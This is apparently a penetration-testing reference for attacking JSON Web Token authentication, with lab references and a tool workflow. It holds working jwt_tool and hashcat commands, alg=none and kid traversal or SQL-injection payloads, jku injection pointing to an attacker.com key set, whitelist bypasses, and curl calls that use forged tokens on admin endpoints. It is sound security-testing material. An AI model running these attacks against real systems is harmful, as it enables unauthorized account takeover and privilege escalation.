---
id: PS-JWT
category: JWT
lab_count: 8
wstg_refs: [WSTG-SESS-10]
---

# JWT: Attack Technique Reference

JSON Web Tokens encode identity claims as a signed JSON structure transmitted in cookies or Authorization headers. A JWT has three Base64url-encoded segments separated by dots: header (algorithm and key metadata), payload (claims like `sub`, `iat`, `exp`), and signature. Attacks target the signature verification process: convincing the server to accept a token with a forged payload by exploiting flaws in how the algorithm or key is selected and validated.

---

## 1. Detection

### 1A. Identify JWT Usage

JWTs follow a distinctive `base64url.base64url.base64url` three-segment pattern. Look for them in:

- **Cookies:** Session cookies or auth cookies that decode to JSON with `alg` in the first segment
- **Authorization header:** `Authorization: Bearer eyJhbG...`
- **URL parameters:** `?token=eyJhbG...` (less common, insecure)
- **Local/session storage:** Frontend JavaScript storing JWTs in `localStorage.getItem('token')`

```bash
# Check cookies for JWT pattern
curl -sk -D- https://target.com/login -X POST -d 'username=test&password=test' | grep -oE '[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

# Check API responses for JWT in JSON body
curl -sk https://target.com/api/login -X POST -H 'Content-Type: application/json' -d '{"username":"test","password":"test"}' | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
```

### 1B. Decode and Inspect

Decode the header and payload to understand the token structure:

```bash
# Decode header (first segment)
echo 'HEADER_SEGMENT' | base64 -d 2>/dev/null

# Decode payload (second segment)
echo 'PAYLOAD_SEGMENT' | base64 -d 2>/dev/null

# Using jwt_tool for full decode
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN>
```

**Key header fields to note:**
- `alg`: Signing algorithm (`HS256`, `RS256`, `ES256`, `none`)
- `typ`: Token type (usually `JWT`)
- `kid`: Key ID -- identifies which key the server should use for verification
- `jwk`: Embedded JSON Web Key
- `jku`: URL pointing to a JWK Set
- `x5c`: X.509 certificate chain

**Key payload fields to note:**
- `sub`: Subject (user identifier -- primary target for modification)
- `iss`: Issuer
- `aud`: Audience
- `exp`: Expiration timestamp
- `iat`: Issued-at timestamp
- `role`, `admin`, `is_admin`: Application-specific privilege claims

### 1C. Locate the JWKS Endpoint

Servers using asymmetric algorithms often expose their public keys:

```bash
# Standard JWKS endpoints
curl -sk https://target.com/.well-known/jwks.json
curl -sk https://target.com/jwks.json
curl -sk https://target.com/.well-known/openid-configuration | jq '.jwks_uri'
```

If the JWKS endpoint is accessible, note the key format (RSA, EC), key IDs, and whether multiple keys are present.

---

## 2. Techniques

### 2A. Unverified Signature

The server decodes the JWT payload but does not verify the signature at all. This happens when developers use a library's `decode()` function instead of `verify()`.

**Steps:**
1. Capture a valid JWT from an authenticated session
2. Decode the payload, modify the target claim (e.g., change `sub` from `wiener` to `administrator`)
3. Re-encode the payload segment (Base64url, no padding)
4. Reassemble the token with the original header, modified payload, and original signature
5. Submit the modified token -- the server accepts it without checking the signature

```bash
# Using jwt_tool
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -T

# Manual: modify payload, keep original header and signature
# Header.ModifiedPayload.OriginalSignature
```

**Key indicator:** Any payload modification is accepted regardless of signature integrity.

> Lab refs: PS-JWT-01

### 2B. None Algorithm Attack

The server accepts tokens with `alg` set to `none`, which means no signature is required. The token is treated as trusted despite being unsigned.

**Steps:**
1. Decode the JWT header and change `"alg"` to `"none"`
2. Modify the payload claims as desired
3. Remove the signature segment entirely but keep the trailing dot
4. Submit: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.MODIFIED_PAYLOAD.`

**Bypass variations for filters:**
- `"alg": "None"` (capitalized)
- `"alg": "NONE"` (all caps)
- `"alg": "nOnE"` (mixed case)

```bash
# Using jwt_tool with none algorithm
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X a

# Manual construction
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"administrator","iat":1234567890}' | base64 | tr -d '=' | tr '+/' '-_')
echo "${HEADER}.${PAYLOAD}."
```

**Important:** The payload must be terminated with a trailing dot even though the signature is empty.

> Lab refs: PS-JWT-02

### 2C. Weak Secret Key Brute Force

Tokens signed with HMAC algorithms (HS256/HS384/HS512) use a shared secret string. If the secret is weak, short, or a common word, it can be cracked offline without sending any requests to the server.

**Steps:**
1. Capture a valid JWT signed with HS256
2. Run hashcat in mode 16500 against a wordlist of common secrets
3. Once cracked, forge new tokens with arbitrary claims signed with the discovered secret

```bash
# Brute force with hashcat (mode 16500 = JWT)
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/jwt-secrets.txt

# Using jwt_tool with dictionary attack
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/jwt-secrets.txt

# Once secret is known, forge a new token
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -T -S hs256 -p "discovered_secret"
```

**Common weak secrets to try first:**
- `secret`, `password`, `123456`, `key`, `jwt_secret`
- Application name, company name, or domain name
- Default secrets from framework documentation

**Wordlists:**
- `/usr/share/wordlists/jwt-secrets.txt` (curated JWT secrets)
- `/usr/share/seclists/Passwords/Common-Credentials/` (general passwords)

> Lab refs: PS-JWT-03

### 2D. JWK Header Injection

The `jwk` header parameter allows embedding a JSON Web Key directly in the token header. If the server trusts the embedded key for verification instead of its own stored key, an attacker can sign tokens with their own RSA key pair and embed the public key in the header.

**Steps:**
1. Generate a new RSA key pair
2. Modify the JWT payload with desired claims (e.g., `sub: administrator`)
3. Embed the attacker's RSA public key in the `jwk` header parameter
4. Sign the token with the attacker's RSA private key
5. The server extracts the public key from the `jwk` header and uses it to verify the signature -- which passes because the attacker signed with the matching private key

```bash
# Using jwt_tool to inject JWK
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X i

# Manual: generate RSA key, construct JWK, embed in header
```

**Token header structure:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_MODULUS",
    "e": "AQAB",
    "kid": "attacker-key"
  }
}
```

> Lab refs: PS-JWT-04

### 2E. JKU Header Injection

The `jku` (JWK Set URL) header parameter tells the server where to fetch the verification key. If the server does not whitelist allowed `jku` URLs, the attacker can point it to their own server hosting a crafted JWKS.

**Steps:**
1. Generate a new RSA key pair
2. Host the public key as a JWKS on an attacker-controlled server
3. Modify the JWT payload and set the `jku` header to the attacker's URL
4. Sign the token with the attacker's private key
5. The server fetches the key from the attacker's URL, verifies the signature, and accepts the token

```bash
# Using jwt_tool
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X s -ju "https://attacker.com/.well-known/jwks.json"
```

**Attacker-hosted JWKS format:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "matching-kid",
      "n": "ATTACKER_MODULUS",
      "e": "AQAB",
      "use": "sig"
    }
  ]
}
```

**URL whitelist bypasses (if server checks the `jku` URL):**
- Open redirect on target: `jku: https://target.com/redirect?url=https://attacker.com/jwks.json`
- URL fragment: `jku: https://target.com#@attacker.com/jwks.json`
- Path confusion: `jku: https://target.com/.well-known/jwks.json@attacker.com`
- SSRF chain: use any SSRF vulnerability to serve the attacker's JWKS from an internal-looking URL

> Lab refs: PS-JWT-05

### 2F. KID Parameter Path Traversal

The `kid` (Key ID) header parameter identifies which key the server should use. If the server constructs a file path from `kid` without sanitization, directory traversal can point it to a predictable file.

**Steps:**
1. Set `kid` to a path traversal sequence targeting a predictable file (e.g., `/dev/null` which is empty)
2. Sign the token using HMAC with an empty string as the secret (matching the empty file content)
3. The server reads `/dev/null` (empty), uses the empty string as the key, and the signature matches

```bash
# Using jwt_tool
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X k -pk /dev/null

# Manual: set kid to path traversal, sign with empty secret
```

**Token header:**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"
}
```

**Variations:**
- **Linux:** `kid: ../../../../dev/null` (sign with empty string `""`)
- **Predictable static file:** `kid: ../../../../etc/hostname` (sign with the hostname as key)
- **SQL injection in kid:** `kid: "' UNION SELECT 'attacker_secret' -- "` (if `kid` is used in a database query, inject a known secret)

```bash
# Sign with empty string for /dev/null traversal
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -T -S hs256 -p "" -kh "../../../../../../../dev/null"
```

> Lab refs: PS-JWT-06

### 2G. Algorithm Confusion (RS256 to HS256)

The server is configured to use RS256 (asymmetric: signs with private key, verifies with public key) but does not enforce the algorithm. The attacker changes `alg` to HS256 (symmetric: same key for signing and verifying). The server then uses its RSA public key as the HMAC secret -- and the attacker, who has the public key, can compute a valid HMAC signature.

**Steps:**
1. Obtain the server's RSA public key (from `/jwks.json`, `/.well-known/openid-configuration`, TLS certificate, or derive from two tokens)
2. Convert the JWK to PEM format
3. Base64-encode the PEM key
4. Modify the JWT: set `alg` to `HS256`, change payload claims as desired
5. Sign the token using HS256 with the Base64-encoded PEM as the secret key

```bash
# Step 1: Obtain the public key
curl -sk https://target.com/.well-known/jwks.json | jq '.keys[0]'

# Step 2-3: Convert JWK to PEM (using jwt_tool or openssl)
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X k -pk public_key.pem

# Step 4-5: Sign with confusion
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X k -pk public_key.pem
```

**When the public key is not directly exposed:**

Use two valid tokens to mathematically derive the RSA public key:

```bash
# Derive public key from two tokens using rsa_sign2n
docker run --rm -it techniques/sig2n <token1> <token2>

# This outputs potential public keys in Base64-encoded PEM format
# Try each candidate: tamper the token with jwt_tool and test against the server
```

The tool outputs keys in both X.509 and PKCS1 formats. The server may accept either -- test both.

**Critical detail:** The PEM key must match the server's stored version exactly, including whitespace and newlines. Use the raw bytes of the PEM file (including `-----BEGIN PUBLIC KEY-----` and `-----END PUBLIC KEY-----` lines) as the HMAC secret.

> Lab refs: PS-JWT-07, PS-JWT-08

---

## 3. JWT Structure Reference

### 3A. Header Fields

| Field | Name | Purpose | Attack Relevance |
|-------|------|---------|------------------|
| `alg` | Algorithm | Signing algorithm | Change to `none`, swap RS256/HS256 |
| `typ` | Type | Token type (usually `JWT`) | Rarely exploitable |
| `kid` | Key ID | Selects verification key | Path traversal, SQL injection |
| `jwk` | JSON Web Key | Embedded public key | Inject attacker's key |
| `jku` | JWK Set URL | URL to fetch key from | Point to attacker server |
| `x5c` | X.509 Cert Chain | Certificate for verification | Inject self-signed cert |
| `x5u` | X.509 URL | URL to fetch certificate | Point to attacker server |
| `cty` | Content Type | Nested JWT content type | Enable XXE/deserialization |

### 3B. Payload Fields

| Field | Name | Purpose | Modification Target |
|-------|------|---------|---------------------|
| `sub` | Subject | User identifier | Change to target user |
| `iss` | Issuer | Token issuer | Match expected issuer |
| `aud` | Audience | Intended recipient | Match expected audience |
| `exp` | Expiration | Unix timestamp | Extend to far future |
| `iat` | Issued At | Creation timestamp | Usually informational |
| `nbf` | Not Before | Validity start time | Set to past if blocking |
| `jti` | JWT ID | Unique token ID | Replay prevention |
| `role` | Role | Application role claim | Escalate to admin |
| `admin` | Admin flag | Admin indicator | Set to `true` |

---

## 4. Attack Tool Commands

### jwt_tool (comprehensive JWT testing)

```bash
# Full scan of all attacks
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -M at

# Tamper mode (interactive claim modification)
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -T

# None algorithm attack
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X a

# JWK injection attack
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X i

# JKU injection attack
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X s -ju "https://attacker.com/jwks.json"

# KID path traversal attack
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -X k -pk /dev/null

# Brute force secret key
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -C -d /path/to/wordlist.txt

# Sign with known secret
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -T -S hs256 -p "known_secret"

# Sign with RSA key for algorithm confusion
rynix_plugin_run('wstg') python3 /opt/jwt_tool/jwt_tool.py <TOKEN> -T -S hs256 -pk public_key.pem
```

### hashcat (offline secret cracking)

```bash
# Mode 16500 = JWT HS256/HS384/HS512
hashcat -a 0 -m 16500 <JWT_TOKEN> /path/to/wordlist.txt

# With rules for mutations
hashcat -a 0 -m 16500 <JWT_TOKEN> /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked result
hashcat -m 16500 --show <JWT_TOKEN>
```

---

## 5. Testing Methodology

Execute attacks in order of increasing complexity. Stop as soon as one succeeds -- further attacks are unnecessary once you can forge arbitrary tokens.

```
JWT detected in session?
├── Step 1: Decode and inspect header/payload
│   ├── Note the algorithm (alg), key ID (kid), and any extra header params
│   └── Note privilege-related claims (sub, role, admin)
│
├── Step 2: Test unverified signature (2A)
│   ├── Modify sub/role claim, keep original signature
│   └── If accepted → CRITICAL: server does not verify signatures
│
├── Step 3: Test none algorithm (2B)
│   ├── Set alg=none, remove signature, keep trailing dot
│   ├── Try case variations: None, NONE, nOnE
│   └── If accepted → CRITICAL: no signature verification
│
├── Step 4: Test weak signing key (2C)
│   ├── Run hashcat -m 16500 against common wordlists
│   ├── If HS256 and secret is cracked → Forge any token
│   └── Takes seconds for weak secrets, skip if no result after 5 min
│
├── Step 5: Test header injection attacks (2D, 2E, 2F)
│   ├── JWK injection: embed attacker's public key in header
│   ├── JKU injection: point to attacker-hosted JWKS
│   ├── KID traversal: set kid=../../../../dev/null, sign with empty
│   └── KID SQL injection: set kid to SQL payload returning known key
│
├── Step 6: Test algorithm confusion (2G)
│   ├── Obtain server's RSA public key
│   ├── Change alg from RS256 to HS256
│   ├── Sign with public key as HMAC secret
│   └── If no exposed key: derive from two valid tokens
│
└── Step 7: Check expiration enforcement
    ├── Reuse an expired token → Is exp validated?
    ├── Set exp to far future → Is the server clock-bound?
    └── Remove exp entirely → Does the server require it?
```

### Verification After Each Attack

After forging a token, verify exploitation by accessing a protected resource:

```bash
# Test forged token against protected endpoint
curl -sk https://target.com/admin \
  -H "Cookie: session=FORGED_JWT"

# Or via Authorization header
curl -sk https://target.com/api/admin \
  -H "Authorization: Bearer FORGED_JWT"
```

If the response shows admin-level content or the target user's data, the attack is confirmed. Log the finding with the forged token as evidence.
## Rynix workflow

1. `get_technique_guide` for `jwt` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `auth_login`, `compare_role_response`, `http_probe`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `auth_login`
- `compare_role_response`
- `http_probe`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

